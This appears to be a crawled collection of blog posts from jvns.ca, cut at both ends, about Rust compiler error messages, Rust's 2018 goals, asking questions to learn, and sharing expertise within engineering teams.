\n Our approach with Rust has always been to bend the curve around tradeoffs, as embodied in the\nvarious pillars we’ve talked about on this blog: \n \n\n I love this approach (“we’re going to make it easier to use WITHOUT compromising reliablity or\nperformance at all”), and I feel like they’ve really delivered on it. \n\n But! When talking about the compiler I’ve tried to be careful to say “easier” instead of “easy” – I\nthink probably there’s some limit to how “easy” Rust can be! There are of course things about Rust\n(like compile-time thread safety guarantees!) where fundamentally you do need to think carefully\nabout what your program is doing exactly. So I don’t expect or want Rust to be “just as easy as\nPython” or anything. \n\n Examples of awesome compiler error messages from today \n\n To show how Rust’s compiler is good: here are a few real examples of compiler error messages I’ve\ngotten in the last day or two. I just found all of these by scrolling back though my terminal. \n\n Here’s the first one: \n\n error[E0507]: cannot move out of borrowed content\n  --> src/bin/ruby-stacktrace.rs:85:16\n   |\n85 |         if let &Err(x) = &version {\n   |                ^^^^^-^\n   |                |    |\n   |                |    hint: to prevent move, use `ref x` or `ref mut x`\n   |                cannot move out of borrowed content\n \n\n This error is incredibly helpful!! I just followed the instructions: I put  ref x  instead of  x \nand my program totally compiled!! This happens relatively often now – I just do what the compiler\ntells me to do, and it works! \n\n Here’s another example of a simple error message: I accidentally left out the parameter to  Err() .\nHere I just think it’s nice that it underlines the exact code with the problem. \n\n error[E0061]: this function takes 1 parameter but 0 parameters were supplied\n   --> src/bin/ruby-stacktrace.rs:154:25\n    |\n154 |             if trace == Err() {\n    |                         ^^^^^ expected 1 parameter\n \n\n One last nice example: I forgot to import the right  Error  type. Rust very helpfully\nsuggests 4 different  Error  types I might have wanted to use there! (I wanted  failure::Error ,\nwhich is on the list!). \n\n error[E0412]: cannot find type `Error` in this scope\n   --> src/lib.rs:792:84\n    |\n792 |     ) -> Result<Box<Fn(u64, pid_t) -> Result<Vec<String>, copy::MemoryCopyError>>, Error> {\n    |                                                                                    ^^^^^ not found in this scope\nhelp: possible candidates are found in other modules, you can import them into scope\n    |\n739 |     use failure::Error;\n    |\n739 |     use std::error::Error;\n    |\n739 |     use std::fmt::Error;\n    |\n739 |     use std::io::Error;\n \n\n there are still annoying parts (and they’re being worked on) \n\n There are of course still some times where the language doesn’t behave in the way I want. For\nexample, I have this type  ruby_stacktrace::address_finder::AddressFinderError  which implements the\n Error  trait. So I should just be able to return an  AddressFinderError  when an  Error  is\nexpected, right? No!! \n\n Instead Rust complains: \n\n    Compiling ruby-stacktrace v0.1.1 (file:///home/bork/work/ruby-stacktrace)\nerror[E0308]: mismatched types\n  --> src/bin/ruby-stacktrace.rs:86:20\n   |\n86 |             return version;\n   |                    ^^^^^^^ expected struct `failure::Error`, found enum `ruby_stacktrace::address_finder::AddressFinderError`\n   |\n   = note: expected type `std::result::Result<_, failure::Error>`\n              found type `std::result::Result<_, ruby_stacktrace::address_finder::AddressFinderError>`\n \n\n I know how to fix this: I can hack around it by writing  return Ok(version?)  and then my program\nwill compile. But the compiler doesn’t tell me how to fix it and it doesn’t give me any super\nclear clues about what to do. \n\n But!!! Basically every single time I have an irritating issue like this, I ask Kamal about it (who\nwrites more Rust than me), and he says “oh yeah, there’s an RFC for that, or at least people are\nactively talking about how to fix that!“. \n\n 2 specific examples of irritations which have accepted RFCs (which means they’re on the road to\nbeing fixed!): \n\n \n There’s an annoying thing where sometimes you need to insert braces around parts of your code to get it to compile. And there’s an accepted RFC called  non-lexical lifetimes  to basically make Rust smarter about variable lifetimes! \n When I work with references (which is always!!) I often end up with a situation where the compiler tells me I need to add or remove an ampersand somewhere (like in the first compiler error message I gave). The accepted RFC  Better ergonomics for pattern-matching on references  makes working with references easier without sacrificing any performance or reliablity! So cool!  The  match ergonomics feature  is now in Rust nightly! \n \n\n It makes me really happy that the Rust community continues to invest time into ergonomics issues\nlike this. These are all individually relatively small annoyances, but when a large number of them\nare fixed I think it really makes a big positive difference to the experience of using of the language. \n\n easy tradeoffs:  .clone() \n\n Another thing I love about Rust is that there are  easy ways to avoid doing hard things . For\nexample!! I have this function called  get_bss_section  in my program. It’s pretty simple – it just\niterates through all the binary sections of an ELF file and returns the section header for the\nsection called  .bss . \n\n pub fn get_bss_section(elf_file: &elf::File) -> Option<elf::types::SectionHeader> {\n        for s in &elf_file.sections {\n            match s.shdr.name.as_ref() {\n                \".bss\" => {\n                    return Some(s.shdr.clone());\n                }\n                _ => {}\n            }\n        }\n        None\n    }\n}\n \n\n I was getting a bunch of ownership errors in the compiler, and I really didn’t feel like dealing\nwith them. So I made an easy tradeoff! I just called  .clone()  which copied the memory and the\nproblem went away. I could go back to focusing on my actual program logic! \n\n I think being able to make tradeoffs like this (where you make the program a little easier to write\nand sacrifice a little bit of performance) is great when starting out with Rust. The thing I love\nthe most about this particular tradeoff is that it’s  explicit . I can search for every place I use\n .clone()  in my program and audit them – are they functions that are called a lot? Should I be\nworried? I just checked and everywhere I use  clone()  in my program is in functions at the\nbeginning of the program that only get called once or twice. Maybe I’ll optimize them later! \n\n Rust’s crate ecosystem is great \n\n In my program, I parse ELF binaries. It turns out that there’s a  crate to do that: the elf crate! . \n\n Right now I’m using the  elf  crate for that. But there’s also the\n goblin  crate, which supports Linux (ELF), Mac (Mach-o), and\nWindows (PE32) binary formats!! I’ll probably switch to that at some point. I love that these\nlibraries exist and that they’re well documented and easy to use! \n\n Another thing I love about Rust crates (and Rust in general) is – I feel like they doesn’t usually\nadd unnecessary abstractions on top of the concepts they’re exposing. The structs in the  elf  crate\nare like –  Symbol ,  Section ,  SectionHeader ,  ProgramHeader .. the concepts in an ELF file! \n\n When I found a weird thing I’d never heard of that I needed to use (the  vaddr  field in the program\nheader), it was right there! And it was called  vaddr , which is the same thing it’s called in the C\nstruct. \n\n Cargo is amazing \n\n Cargo is Rust’s package manager and build tool and it’s great. I think this is pretty well known.\nThis is especially apparent to me right now because I’ve been using Go recently – There are lots of\nthings I like about Go but Go package management is extremely painful and Cargo is just so easy to\nuse. \n\n My dependencies in my  Cargo.toml  file look something like this. So simple! \n\n [dependencies]\nlibc = \"0.2.15\"\nclap = \"2\"\nelf = \"0.0.10\"\nread-process-memory = \"0.1.0\"\nfailure = \"0.1.1\"\nruby-bindings = { path = \"ruby-bindings\" } # internal crate inside my repo\n \n\n Rust gives me total control (like C!) \n\n In Rust I can control every single aspect of what my program is doing – I determine exactly what\nsystem calls it makes, what memory it allocates, how many microseconds it sleeps for – everything.\nI feel like anything I could do in a C program, I can do in Rust. \n\n I really love this. Rust isn’t my go-to language for most programming tasks (if I wanted to write a\nweb service, I probably wouldn’t personally use Rust. See  are we web yet  if you’re interested in web services in Rust though!). I feel kind of like Rust is my superhero\nlanguage!  If I want to do some weird systemsy magical thing, I know that it’ll be possible in Rust.\nMaybe not easy, but possible! \n\n bindgen & macros are amazing \n\n I wrote blog posts about these already but I want to talk about these again! \n\n I  used bindgen  to generate Rust struct\ndefinitions for every Ruby struct I need to reference (across 35 different Ruby version). It was\nkind of… magical? Like I just pointed at some internal Ruby header files (from my local clone of\nthe Ruby source) that I wanted to extract struct definitions from, told it the 8 structs I was\ninterested in, and it just worked. \n\n I think the fact that bindgen lets you interoperate so well with code written in C is really\nincredible. \n\n Then I used macros (see:  my first rust macro ) and wrote a bunch of code that\nreferenced those 35 different struct versions made sure that my code works properly with all of them. \n\n And when I introduced a new Ruby version (like 2.5.0) which had internal API changes, the compiler\nsaid “hey, your old code working with the structs from Ruby 2.4 doesn’t compile now, you have to\ndeal with that”. \n\n What should Rust’s 2018 goals be? \n\n In  New Year’s Rust: A Call for Community Blogposts  the Rust core team asked for the community to write blog posts about what they think the Rust language’s goals should be in 2018.  I read and enjoyed a lot of these posts. My favourite two are Aaron Turon’s post:  Rust in 2018: a people perspective  and withoutboats’  My Goals for Rust in 2018 \n\n I really loved how withoutboats closed their blog post: \n\n \n When a programmer with experience in higher level languages begins to use Rust, the space of\nprograms that they now have the technology to write expands dramatically. I want to see the kinds\nof programs that emerge when systems programming knowledge is widespread and easy to acquire, when\nanyone with an interest can take the skills they already have and use it to start tinkering in\ndomains that once might have seemed inaccessible to them, such as operating systems, network\nprotocols, cryptography, or compilers. \n \n\n Here are my 2 ideas for goals! \n\n Goal 1: A major release marketed as “Rust: it’s easier to use now” \n\n I think Rust has a huge opportunity to empower people to write interesting and difficult programs\nthat they couldn’t have written without Rust. Like profilers! Networking software! Debuggers!\nOperating systems! \n\n But for people to use Rust, I think it’s important to  tell them that Rust is easier to work with\nnow . \n\n I live with an enthusiastic Rust programmer (Kamal) who pays close attention to Rust language\ndevelopments and who I talk to about Rust. And I didn’t realize that there had been so many\nimprovements to Rust’s usability until I started using it again!! So if I didn’t realize I imagine\nmost other people didn’t either :) \n\n I think Rust has a bit of a reputation for being hard to learn. And of course it’s always going to\nbe a little bit hard! But I think it would be great to have a Firefox Quantum-style release being\nlike “hey, did you get frustrated with the Rust compiler when you last tried Rust? We worked on it a\nlot! Give us another shot!” \n\n Goal 2: Explain on rust-lang.org who the Rust programming language is for \n\n I think it’s still a bit hard (especially for newcomers!) to tell which people and what projects\nRust is a good choice for. Like – Rust is really cool and it’s for a lot of different kinds of\npeople  but it’s still a bit of a specialized thing, and it’s actually not for everyone. So who is\nit for? (the  friends of rust page  is the best\nresource I know) \n\n Rust is great about being inclusive (“Rust could be for you!”) but IMO “here are 10 specific groups\nof people Rust is for” is dramatically more useful than a generic inclusive statement. \n\n Here are a few suggestions for how to answer the question “Who is Rust for?”: (these aren’t meant to\nbe exclusive, but they are intended to be pretty specific! I think Rust is probably for all these\npeople, and many more :)) \n\n \n Rust is  for people who wish they could write C /C++ programs but found those languages too\nunapproachable. \n Rust is  for people building large, complex, performance-sensitive systems software projects .\nLarge parts of Firefox are written in Rust and Rust contributed to significantly improving\nFirefox’s performance. \n Rust is  for C/C++ experts  who want better compile-time guarantees about undefined behavior. \n Rust is  for people who want to write secure systems code  that’s safe from buffer overflows and\nother undefined behavior. \n Rust is  for students  and people who are interested in learning about systems concepts. Many\npeople have learned about topics like operating systems development through Rust. \n Rust is  for embedded programmers  who want the power of higher-level languages but need code that\ncompiles to be as small and efficient as C code. \n Rust is  for companies ! Here are some stories about how people are building businesses on Rust. \n Rust is  for people who want to build the Rust programming language . We’d love you\nto contribute to the Rust language. \n \n\n Also – who  isn’t  Rust for? What are groups Rust’s  wants  to be for but isn’t for yet? What group\nof people is Rust explicitly not trying to serve? \n\n I think it’s exciting that Rust serves such different groups of people – like I think Rust is for\npeople who wish they could write C/C++ but find those languages hard, and that Rust is  also  for\nC/C++ experts who want more from their systems programming languages. \n\n That’s all! I am very excited about Rust in 2018 and about continuing to work in Rust for the next\n10 weeks! \n\n"},
{"url": "https://jvns.ca/blog/2014/06/13/asking-questions-is-a-superpower/", "title": "Asking questions is a superpower", "content": "\n      There are all kinds of things that I think I “should” know and don’t.\nA few things that I don’t understand as well as I’d like to: \n\n \n Database replication and sharding (seriously how does replication\neven work) \n How fast a computer can process data (should I expect more or less\nthan 6GB/s if it’s a simple CPU-bound program where the data is\nalready in RAM?) \n How do system calls work, reeeeally? (I do not understand context\nswitching nearly as well as I could!) \n An truly embarrassing amount of basic statistics, even though I have\na math degree. \n \n\n There are lots of much more embarrassing things that I just can’t\nthink of right now. \n\n I’ve started trying to ask questions any time I don’t understand\nsomething, instead of worrying about whether people will think I’m\ndumb for not knowing it. This is  magical , because it means I can\nthen learn those things! \n\n \n\n One of my very favorite examples of this is how I started learning\nabout operating systems. At the beginning of Hacker School, I realized\nthat I legitimately did not know what a kernel was or did more than\n“er, operating system stuff”. \n\n This was super embarrassing! I’d been using Linux for 10 years, and I\ndidn’t really understand at all what the basic responsibilities of the\nLinux kernel were. Oh no! Instead of hiding under a rock, I  asked .\nAnd then people told me, and I wrote\n What does the Linux kernel even do? . \n\n I don’t know how I would have learned without asking. Now I have given\ntalks about getting started with understanding the Linux kernel! So\nfun! \n\n One surprising thing about asking questions is that when I start\ndigging into a problem, people who I respect and who know a lot will\nsometimes not know the answers at all! For instance, I’ll think that\nsomeone totally knows about the Linux kernel, but of course they don’t\nknow everything, and if I’m trying to do something specific like write\na rootkit they might not know all the details of how to do it. \n\n aphyr  is a really good example of someone who\nasks basic questions and gets unexpected answers. He does research\ninto whether distributed systems are reliable (linearizable?\nconsistent? / available?). The results he finds are like\n RabbitMQ might lose 40% of your data .\nOoooops. If you don’t start asking questions about how RabbitMQ works\nfrom the beginning (in his case, by writing a program called Jepsen\nthat automates this kind of reliability testing), then you’ll never\nfind that out. (be skeptical! Don’t believe what people say even if\nthey’re using fancy words!) \n\n “I don’t understand.” \n\n Another hard thing is admitting that I don’t understand. I try to not\nbe too judgemental about this – if someone is explaining something to\nme and it doesn’t make sense, it’s possible that they’re explaining it\nbadly! Or that I’m tired! Or any other number of reasons. But if I\ndon’t  tell  them I’m don’t understand, I’m never going to understand\nthe damn thing. \n\n So I try to take a deep breath and say cheerfully “Nope!”, figure\nexactly which aspect of the thing I don’t understand, and ask a\nclarifying question. \n\n As a side effect, when I go to a talk about a subject I’m interested in, and I\ndon’t understand something, I’m a lot more willing to ask questions like “so\nwhat IS <basic concept that wasn’t explained>?“. Usually people are\nreally happy to answer! \n\n Avoiding mansplaining \n\n A difficult thing about asking questions is that I have to be pretty\ncareful about asking the  right  questions and making it clear which\nparts I know already. This is just good hygiene, and makes sure\nnobody’s time gets wasted. \n\n For instance, I have sometimes said things like “I don’t know anything\nabout statistics”, which is actually false and sometimes results in\npeople trying to explain basic probability theory to me, or what an\nestimator is, or maybe the difference between a biased and unbiased\nestimator. It turns out these are actually things I know! So I need to\nbe more specific, like “can we walk through some basic survival\nanalysis?” (actually a thing I would like to understand!) \n\n HUGE SUCCESS \n\n So! Understanding and learning are more important than feeling smart.\nProbably the most important thing I learned at Hacker School was how\nto ask questions and admit when I don’t understand something. I know\nway more things now as a result! (see: this entire blog of things I\nhave learned) \n"},
{"url": "https://jvns.ca/blog/2022/12/02/a-couple-of-rust-error-messages/", "title": "A couple of Rust error messages", "content": "\n     \n\n Hello! \n\n I’ve been doing  Advent of Code  in Rust for the\npast couple of days, because I’ve never really gotten comfortable with the\nlanguage and I thought doing some Advent of Code problems might help. \n\n My solutions aren’t anything special, but because I’m trying to learn, I’ve\nbeen trying to take a slightly more rigorous approach than usual to compiler\nerrors. Instead of just fixing the error and moving on, I’m trying to make sure\nthat I actually understand what the error message means and what it’s telling\nme about how the language works. \n\n My steps to do that are: \n\n \n fix the bug \n make a tiny standalone program reproducing the same compiler error \n think about it and try to explain it to myself to make sure I actually understand why that error happened \n ask for help if I still don’t understand \n \n\n So here are a couple of compiler errors and my explanations to myself of why\nthe error is happening. \n\n Both of them are pretty basic Rust errors, but I had fun thinking about them\ntoday. I wrote this for an imagined audience of “people who know some Rust\nbasics but are still pretty bad at Rust”, if there are any of you out there. \n\n error 1: a borrowing error \n\n Here’s some code ( rust playground link ): \n\n fn inputs() -> Vec<(i32, i32)> {\n    return vec![(0, 0)];\n}\nfn main() {\n    let scores = inputs().iter().map(|(a, b)| {\n        a + b\n    });\n    println!(\"{}\", scores.sum::<i32>());\n    \n}\n \n\n And here’s the compiler error: \n\n 5 |     let scores = inputs().iter().map(|(a, b)| {\n  |                  ^^^^^^^^ creates a temporary which is freed while still in use\n6 |         a + b\n7 |     });\n  |       - temporary value is freed at the end of this statement\n8 |     println!(\"{}\", scores.sum::<i32>());\n  |                    ------ borrow later used here\n  help: consider using a `let` binding to create a longer lived value\n  |\n5 ~     let binding = inputs();\n6 ~     let scores = binding.iter().map(|(a, b)| {\n  |\n\nFor more information about this error, try `rustc --explain E0716`.\n \n\n This is a pretty basic Rust error message about borrowing, but I’ve forgotten\neverything about Rust so I didn’t understand it. \n\n There are 2 things I didn’t know / wasn’t thinking about here: \n\n thing 1 : Variables are  semantically meaningful  in Rust. \n\n What I mean by that is that this code: \n\n let scores = inputs().iter().map(|(a, b)| { ... };\n \n\n does  not do the same thing  as if we factor out  inputs()  into a variable, in this code: \n\n let input = inputs();\nlet scores = input.iter().map(|(a, b)| { ... };\n \n\n If some memory is allocated and it isn’t in its own variable, then it’s freed\nat the end of the expression (though there are some exceptions to this\napparently, see  rustc --explain E0716  for more). But it  does  have its own\nvariable, then it’s kept around until the end of the block. \n\n In the error message the Rust compiler actually suggests an explanation to read\n( rustc --explain E0716 ), which explains all of this and more. I didn’t notice\nit right away, but once I read it (and Googled a little), it really helped me. \n\n thing 2 :. Computations with  iter()   don’t happen right away . \n\n This is something that I theoretically knew, but wasn’t thinking about how it\nmight relate to compiler errors. \n\n When I call  .map(...) , that doesn’t actually do the  map  right away – it\njust sets up an iterator that can do actual calculation later, when we call\n .sum() . \n\n This means that I need to keep around the memory from  inputs() , because none\nof the calculation has even happened yet! \n\n error 2: summing an  Iterator<()> \n\n Here’s some code ( rust playground link ) (This isn’t the actual code I was debugging, but it’s the fastest way to demonstrate the error message) \n\n fn main() {\n    vec![(), ()].iter().sum::<i32>();\n}\n \n\n This has a pretty obvious bug: You can’t sum a bunch of  ()  (the empty type)\nand get an  i32  as a result. Here’s the compiler error, though: \n\n 2 |     vec![(), ()].iter().sum::<i32>();\n  |     ^^^^^^^^^^^^^^^^^^^ --- required by a bound introduced by this call\n  |     |\n  |     the trait `Sum<&()>` is not implemented for `i32`\n \n\n This was very confusing to me – I’d expect to see an error saying something\nlike  Sum is not implemented for Iterator<()> . But instead it says that  Sum  is\nnot implemented for  i32 . But I’m not trying to sum i32s! What’s going on? \n\n What’s actually going on here is (thanks to some lovely people who helped me out!): \n\n \n i32  has a static method called  sum(iter: Iterator<i32>) , that comes from the  Sum  trait . ( defined here for integers ) \n Iterator  has a  sum()  method that calls this static method on  i32  ( defined here ) \n when I run  my_iter.sum() , it tries to call  i32::sum(my_iter) \n But  i32::sum  isn’t defined for  Iterator<&()> ! \n The type parameter in  Sum  (eg)  Sum<&()>  refers to the type of the  iterator  that’s being passed to  i32::sum() \n as a result, we get the error message  the trait Sum<&()> is not implemented for i32 \n \n\n I might not have gotten all the types/terms exactly right here, but I think\nthat’s the gist of it. \n\n This was a good reminder that sometimes methods (like  sum()  on  Iterator  are\ndefined in slightly indirect/counterintuitive ways and that you have to hunt\ndown the details of how it’s implemented to understand the compiler errors. \n\n \n(my actual bug here was actually that I’d accidentally added an extra  ;  in my\ncode, which meant that I accidentally created an  Iterator<()>  instead of an\n Iterator<i32> , and the confusing error message made it harder to figure out that\nout)\n \n\n Rust error messages are cool \n\n I found these error messages pretty helpful, I especially really appreciated the  --explain  output on the borrowing error. \n\n"},
{"url": "https://jvns.ca/blog/2016/04/30/building-expertise-at-work/", "title": "How does knowledge get locked up in people's heads?", "content": "\n     \n\n or, “Building expertise at work” \n\n I mentioned yesterday that I joined a new team at work this week, so learning and expertise have been on my mind. For the first time in a while, I’m working on systems that I don’t always understand very well, and where I often can’t figure out what the system does on my own. \n\n Something that has really bothered me at work, for a long time, is – there are a bajillion people who know amazing things, and often that knowledge gets stuck in their head and other people don’t end up learning it. For years, sometimes! How can this be?! \n\n I’m trying to understand this, so as usual I decided to write about it. \n\n In this post I’ve come up with a couple of reasons sharing information is hard, and a few things I’ve seen actually work for making your team have more experts. All of this assumes that everyone is on the same side and genuinely wants to share information. \n\n Discovery: who knows the thing? \n\n So, if you’re going to learn awesome stuff from the people you work with, first you have to actually know that they know it. here’s an handful of examples of stuff I know that other people know. \n\n \n erik knows a lot about jvm performance (as does ianoc, I think) \n to get information about scala I’d just go to the #scala slack channel because there are a ton of scala experts. scala information is easy to come by. \n nelhage writes the most about the linux kernel and evan knows a ton too \n cory just wrote  cool blog posts about java garbage collection  so it turns how he knows about that. \n jessitron knows about  java concurrency models  and her and jorge wrote a great article about  implicits \n alyssa has a PhD in statistics and can answer basically any stats question I have \n \n\n I have a bajillion pairings of people <-> information like this in my head. But as I’m writing down these examples, I’m realizing how  not  obvious it is who knows what! For instance, suppose I was running into a problem with JVM garbage collection 4 weeks ago. I would definitely 100% not have thought to ask Cory. But turns out he knows a lot about that! \n\n And Ray wrote Cloudflare’s DNS server. He won’t tell you this if you meet him so you have to go look at his LinkedIn or something and read about it. This is a super relevant thing to know if you work with him! \n\n If I had a question about Go, I’d probably look up who has committed to Go services internally, and maybe I’d come up with Carl or Colin, but I also happen to know that Aditya knows quite a bit about Go and  gave a cool talk at Gophercon . I don’t know how I’d discover that without googling “$coworker golang” for every single one of my coworkers. And that wouldn’t even do it because lots of people don’t have an internet presence. Or maybe I wouldn’t notice Mark’s great  Go By Example  site. There are probably at least 7 people at work who are really good at Go and I have no idea who they are. I just found out this second that Mark has a ton of interesting Clojure repositories on github. There is so much I don’t know about my coworkers’ expertise! Eek. \n\n So, discovery. In general I know (or can easily find out) what projects people work on at work. That is no problem. But. I’m constantly shocked by how often I find out that there’s a topic I need to know about for work and someone I work with either \n\n \n has a ton of previous professional experience with the topic (“oh yeah i worked on networking for 6 years”) \n maintains an important open source project in the field that I had no idea about \n has been learning about the topic in their spare time and now knows a lot about it \n … maybe most importantly,  don’t  know a lot about the topic and are really really eager to learn about it and we could totally learn together and be wizards \n \n\n and  I had no idea . I basically think this is a travesty. People occasionally run internal talks about topics they know about which is THE BEST. But honestly sometimes I wish every developer (to say nothing of my other great colleagues!!!) I work with came with a resume or document or something saying HERE IS WHY THIS PERSON IS REALLY IMPRESSIVE AND AWESOME AND THESE ARE THE THINGS THEY ARE AN EXPERT ON. \n\n Okay, so that’s discovery. I don’t know how to fix it but I think it should be fixed, because not knowing that you have internal experts on a topic is just silly. \n\n how do people become experts? \n\n Here’s the easiest way. \n\n \n person builds system from scratch \n person is the expert forever \n \n\n This sucks. The person who built the system has to answer questions about it forever, which puts a lot of pressure on them, and other people can’t modify the system if the person is on vacation (“bus factor”). \n\n I find this a little mysterious because there are internal systems that are important which have a Single True Expert but that I honestly don’t feel are  so  complicated – they’re often a few thousand lines of code, and have some history and complexity, but I feel like somebody else could learn almost everything about the thing in 6 months. But often nobody does. \n\n Like everything in this blog post, I don’t know the answer to this one. It’s easy to be an expert on a system that you built from scratch. \n\n I think there are maybe two reasons for that (and probably more!) \n\n First, if you built it then you have a really strong sense for the  history  of the system. Systems don’t come into being fully formed, and if you try to understand them that way it doesn’t work. \n\n Second, you end up with this sense of… entitlement, or something, to knowledge about the system. If someone asks me a question about a system I started, my basic assumption is “yeah, I can answer that, no problem!”. And even if I haven’t looked at it for 6 months or other people have done significant development work on it afterwards, I  still  expect to be able to just ask them questions about what they did and figure out the answer to arbitrary questions about the system. \n\n But for systems that I  didn’t  build, I don’t always feel that sense of “uh yeah I can definitely work that out just give me a minute / an hour / 3 hours”. Even though often it’s not that hard to figure out! \n\n I kind of feel like telling someone that they can’t understand a system or that it’s “too hard” or like “yeah that’s weird only $other_person” knows about that is like… a crime. We should all expect to be able to understand the software systems that we work with! right???? \n\n Now that we’ve talked about problems, here are a few ideas for solutions. \n\n to make someone an expert, ask them questions \n\n One thing I’ve noticed is that sometimes you have Person A and Person B who know roughly the same things but somehow Person A ends up being more respected and becoming the Internal Expert Who Everyone Goes To just because they’re better at communicating those things / advertising that they know it. \n\n I think some people just like answering questions about a topic more, which is fine. But I think it’s more than that. \n\n If everyone always asks Person A questions about the System, then that is itself an organizational investment in Person A’s knowledge. They’re constantly practicing answering questions and updating their knowledge and checking their understanding of the system. \n\n This was a huge thing on my old team – for a long time, a small subset of people were responsible for answering questions on behalf of the team. Then we brought a bunch more people into the rotation. And after that those people reported feeling like they understood the system way better! Because they had to actually answer questions and figure out the answers if they didn’t know. \n\n Kiran  often says that you can build people who are “caches” for information – put them in charge of answering questions, they slowly start to accumulate knowledge and eventually become experts. Give them code reviews to do! Take their feedback seriously! Put them in charge of an architecture decision! Believe in them =D \n\n I think the One True Expert has a role here too – if other people are going to become experts alongside them, then they need to sometimes hold off on answering questions and doing debugging work, even if it would be faster for them to do it or if they know the answer instantly. I always find this hard, but I think it’s worthwhile. \n\n I think it’s worth considering who you encourage people to go to with questions. Is it always the same person? Why? \n\n apprenticeships \n\n Dan Luu  gave me some feedback on this post and he mentioned that an apprenticeship model has been successful for him in the past. Here’s how he described it: \n\n \n Someone new comes in \n Experienced person sits down next to new person and walks them through every “new” task for some period. At the first place I worked, this would be weeks or months. \n During and after, experienced person makes themselves super available for questions at any time. \n \n\n I find this interesting because it’s a longer-term commitment. As time goes on new things becomes less and less frequent, but I think it’s really important to observe that that can actually take months. Sometimes I think there’s an expectation that somebody is done learning after just a few weeks which really isn’t true. \n\n talks \n\n Let’s talk about internal talks! I LOVE talks. I find it kind of curious that outside of work I give tons of talks (“want to talk at montreal ruby next month? sure!!!!”) but at work I give almost no talks, and most of my colleagues don’t either. What’s up with that??? \n\n I think it’s easy to assume that if you propose an internal talk series, people will just show up with great talk ideas, but this actually isn’t true at all! You need to prod people into “hey remember this thing that you know really well and is really important? OTHER PEOPLE DO NOT KNOW IT!!!” and they’ll be like “oh yeah right!!” and then give a killer talk about it. \n\n This week I remembered that not everyone I work with knows how to use tcpdump, and it’s a useful tool to have in hand, so I organized a tcpdump workshop for next week! Yay! \n\n “how did you find that out?” \n\n This is a MAGICAL TACTIC. I forget who I learned it from but maybe Alyssa. \n\n Sometimes I ask someone a question “hey why is the database having timeouts” and the answer is “oh sorry I fixed it”. This is sometimes great and sometimes my LEAST FAVORITE ANSWER. \n\n I often follow up with \n\n \n how did you do that? \n how did you know that? \n what command did you run? \n \n\n This is a great way to extract information from experts – often they don’t realize what they know, but if you ask them what they did FIVE MINUTES AFTER THEY DID IT they can usually remember. \n\n From the other side, when people ask me questions I also often try to include the source of my answer – “the answer is $blah but I found it by doing X Y Z”. \n\n building expertise is hard! \n\n All this stuff is really hard to get right, but it feels to me really really worth it – if you have a Single Person who is the only expert on a system for a long time, I think it’s ultimately really bad for the system and for the organization. \n\n I would love to know how you make this work! Have you become an expert on a project that someone else started and is 2 years old? Did you successfully hand off a large body of work so that you basically never answer questions about it anymore? (without quitting?) Do you have a really strong sense for who knows what in your organization and you feel like they teach other people really effectively? How did you do it? \n\n \nthanks to Laura Lindzey and Dan Luu for their comments!\n \n\n"},
{"url": "https://jvns.ca/blog/2021/10/21/how-to-get-useful-answers-to-your-questions/", "title": "How to get useful answers to your questions", "content": "\n     \n\n 5 years ago I wrote a post called  how to ask good questions .\nI still really like that post, but it’s missing a few of the tactics I use to\nget useful answers like “interrupt people when they’re going off on an\nirrelevant tangent”. \n\n what can go wrong when asking questions \n\n Often when I ask a vague or underspecified question, what happens is one of: \n\n \n the person starts by explaining a bunch of stuff I already know \n the person explains some things which I don’t know, but which I don’t think\nare relevant to my problem \n the person starts giving a relevant explanation, but using terminology that\nI don’t understand, so I still end up being confused \n \n\n None of these give me the answer to my question and this can be quite\nfrustrating (it often feels condescending when someone embarks on a lengthy\nexplanation of things I already know, even if they had no way of knowing that I\nalready know those things), so let’s talk about I try to avoid situations like\nthis and get the answers I need. \n\n Before we talk about interrupting, I want to talk about my 2 favourite\nquestion-asking tactics again – asking yes/no questions and stating your\nunderstanding. \n\n ask yes/no questions \n\n My favourite tactic is to ask a yes/no question. What I love about this is that\nthere’s a much lower chance that the person answering will go off on an\nirrelevant tangent – they’ll almost always say something useful to me. \n\n I find that it’s often possible to come up with yes/no questions even when\ndiscussing a complicated topic. For example, here are a bunch of yes/no\nquestions I asked a friend when trying to learn a little bit about databases from them: \n\n \n how often do you expect db failovers to happen? like every week? \n do you need to scale up by hand? \n are fb/dropbox both using mysql? \n does fb have some kind of custom proprietary mysql management software? \n is this because mysql and postgres were designed at a time when people didn’t\nthink failover was something you’d have to do that frequently? \n i still don’t really understand that blog post about replsets, like is he\nsaying that mongodb replication is easier to set up than mysql replication? \n is orchestrator a proxy? \n is the goal of the replicas you’re talking about to be read replicas for performance? \n do you route queries to a shard based on the id you’re searching for? \n is the point that with compression it takes extra time to read but it doesn’t matter because you almost never read? \n \n\n The answers to yes/no questions usually aren’t just “yes” or “no” – for all of\nthose questions my friend elaborated on the answer, and the elaborations were\nalways useful to me. \n\n You’ll notice that some of those questions are “check my understanding”\nquestions – like “do you route queries to a shard based on the id you’re\nsearching for?” was my previous understanding of how database sharding worked,\nand I wanted to check if it was correct or not. \n\n I also find that yes/no questions get me answers faster because they’re\nrelatively easy to answer quickly. \n\n state your current understanding \n\n My second favourite tactic is to state my understanding of how the system works. \n\n Here’s an example from the “asking good questions” post of a “state your understanding”  email I sent to the rkt-dev mailing list : \n\n \n I’ve been trying to understand why the tree store / image store are designed the way they are in rkt. \n\n My current understanding of how  Docker ’s image storage on disk works right now (from  https://docs.docker.com/engine/userguide/storagedriver/imagesandcontainers/ ) is: \n\n \n every layer gets one directory, which is basically that layer’s filesystem \n at runtime, they all get stacked (via whatever CoW filesystem you’re using) \n every time you do IO, you go through the stack of directories (or however these overlay drivers work) \n \n\n my current understanding of rkt’s image storage on disk is: (from the “image lifecycle” section here:  https://github.com/coreos/rkt/blob/master/Documentation/devel/architecture.md ) \n\n \n every layer gets an image in the image store \n when you run an ACI file, all the images that that ACI depends on get unpacked and copied into a single directory (in the tree store) \n \n\n guess at why rkt decided to architect its storage differently from Docker: \n\n \n having very deep overlay filesystems can be expensive \n so if you have a lot of layers, copying them all into a directory (the “tree store”) results in better performance \n \n\n So rkt is trading more space used on disk (every image in the image store gets copied at least once) for better runtime performance (there are no deep chains of overlays) \n\n Is this right? Have I misunderstood what rkt does (or what Docker does?) Are there other reasons for the difference? \n \n\n This: \n\n \n states my goal (understand rkt’s design choices) \n states my understanding of how rkt and docker work \n makes some guesses at the goal so that people can confirm/deny \n \n\n This question got a  great reply , which among other things pointed out something\nthat I’d totally missed – that the ACI format is a DAG instead of a linked\nlist, which I think means that you could install Debian packages in any order\nand not have to rebuild everything if you remove an  apt-get install  in the\nmiddle of your Dockerfile. \n\n I also find the process of writing down my understanding is really helpful by\nitself just to 